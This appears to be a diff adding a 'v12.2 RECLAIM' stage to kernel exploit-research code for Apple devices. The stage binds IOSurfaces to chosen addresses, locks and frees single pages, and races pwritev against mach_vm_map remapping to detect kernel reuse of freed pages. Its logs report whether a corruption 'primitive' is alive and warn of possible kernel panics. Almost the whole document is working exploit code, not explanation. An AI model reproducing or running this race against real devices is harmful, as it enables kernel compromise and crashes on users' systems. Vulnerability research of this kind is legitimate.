@@ -1036,6 +1036,98 @@ static CFNumberRef RCNUM(int64_t v) {
         }
     }
 
+    /* ---- v12.2 RECLAIM (cs2 mlock-munlock choreography): bind ONE
+       fingerprint surface at ONE hot window's own address (IOSurfaceAddress
+       = searchMap + off — the same binding the in-app searchMap wrap uses),
+       mlock it, then release it — exactly that page goes back to the pool —
+       and re-race the single stale index. Non-own content = kernel reuse in
+       a page we SPECIFICALLY freed. Uses only our own addresses; if the
+       kernel refuses client-supplied IOSurfaceAddress on this device, the
+       stage logs that honestly and continues (v12's whole-surface path
+       already ran above). PANIC-POSSIBLE; solo; one per force-quit. */
+    {
+        rc_log("--- v12.2 RECLAIM: bind->mlock->munlock(one window)->re-race (PANIC-POSSIBLE) ---");
+        uint64_t cand22[8]; uint32_t candN = 0;
+        for (uint32_t i = 0; i < rc_hotN && candN < 4; i++) cand22[candN++] = rc_hotOffs[i];
+        if (warmN && candN < 8) cand22[candN++] = rc_warm[warmN - 1];
+        static uint64_t rfillA = 0, rfillB2 = 0;
+        rfillA  = ((uint64_t)arc4random() << 32) | arc4random();
+        rfillB2 = ~rfillA;
+        uint32_t bound22 = 0, refused22 = 0, hits22 = 0, ours22 = 0;
+        for (uint32_t ci = 0; ci < candN; ci++) {
+            uint64_t off = cand22[ci];
+            IOSurfaceRef s22 = NULL;
+            {
+                CFMutableDictionaryRef d22 = CFDictionaryCreateMutable(
+                    kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+                    &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(d22, CFSTR("IOSurfaceAddress"),
+                                     RCNUM((int64_t)(searchMap + off)));
+                CFDictionarySetValue(d22, CFSTR("IOSurfaceAllocSize"),
+                                     RCNUM((int64_t)vm_page_size));
+                s22 = pCreate((__bridge CFDictionaryRef)(__bridge NSDictionary *)d22);
+                CFRelease(d22);
+            }
+            if (!s22) {
+                refused22++;
+                if (ci == 0) rc_log("[v12.2] bind not honored (IOSurfaceAddress refused) — stage2 skipped");
+                continue;
+            }
+            bound22++;
+            if (pPrefetch) pPrefetch(s22);   /* mlock the single window */
+            /* fingerprint the bound range through our task mapping */
+            for (uint32_t q = 0; q < (uint32_t)(vm_page_size / 16); q++) {
+                uint64_t *w = (uint64_t *)(searchMap + off) + 2 * q;
+                w[0] = rfillA; w[1] = rfillB2;
+            }
+            /* munlock = release: exactly this window returns to the pool */
+            CFRelease(s22);
+            /* re-race ONLY this stale index, 25 iters */
+            uint32_t pg22 = (uint32_t)(off / vm_page_size);
+            for (int it22 = 0; it22 < 25; it22++) {
+                mach_vm_address_t a22 = pcBig;
+                mach_vm_map(mach_task_self(), &a22, 0x8000, 0,
+                    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0, false,
+                    VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
+                memset_pattern8((void *)pcBig, &m0, 0x8000);
+                pwrite(fdMark, zreset, sizeof(zreset), 0x3f00);
+                struct iovec iov22 = { (void *)(pcBig + 0x3f00), 0x4000 };
+                rc_mapAddr = pcBig; rc_mapSize = 0x8000;
+                rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
+                rc_raceOn = 1;
+                pwritev(fdMark, &iov22, 1, 0x3f00);
+                while (rc_raceOn == 1);
+                pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
+                uint64_t got22 = 0; int32_t dlt22 = 0;
+                rc_cls_t c22 = rc_cls(rbBuf, pg22 + 1, npages, &got22, &dlt22);
+                if (c22 == C_FOREIGN) {
+                    BOOL fp22 = NO;
+                    for (int qi = 0; qi < RC_NQ; qi++)
+                        if (rbBuf[qi] == rfillA || rbBuf[qi] == rfillB2)
+                            { fp22 = YES; break; }
+                    if (fp22) ours22++;          /* page came back to US, not the kernel */
+                    else if (hits22 < 3) {
+                        hits22++;
+                        rc_log("  v12.2 FOREIGN off=0x%llx q0=0x%016llx q1=0x%016llx "
+                               "(single-window reuse candidate)",
+                               (unsigned long long)off, rbBuf[0], rbBuf[1]);
+                        rc_aim(rbBuf, c22, fdMark, off, vm_page_size, hmarker);
+                    }
+                }
+            }
+        }
+        rc_log("v12.2: bound=%u refused=%u hits=%u fp-still-ours=%u",
+               bound22, refused22, hits22, ours22);
+        if (hits22 > 0) {
+            char fh22[24];
+            snprintf(fh22, sizeof fh22, "%u", hits22);
+            LabBanditFeat fe22[2] = { { "stage", "v12.2-mlock" },
+                                      { "foreign", fh22 } };
+            LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
+                                LABB_SIG_FOREIGN, LABB_E_DEVICE, fe22, 2);
+        }
+    }
+
     rc_log("READ: WRONG/FOREIGN on either path = primitive alive.");
     rc_log("OK=M0 + FAIL=ZERO = swap either loses (copy M0) or wins too early (EFAULT, no copy).");
     rc_log("OK=CORRECT = swap won and pwritev copied M1 correctly (no confusion).");
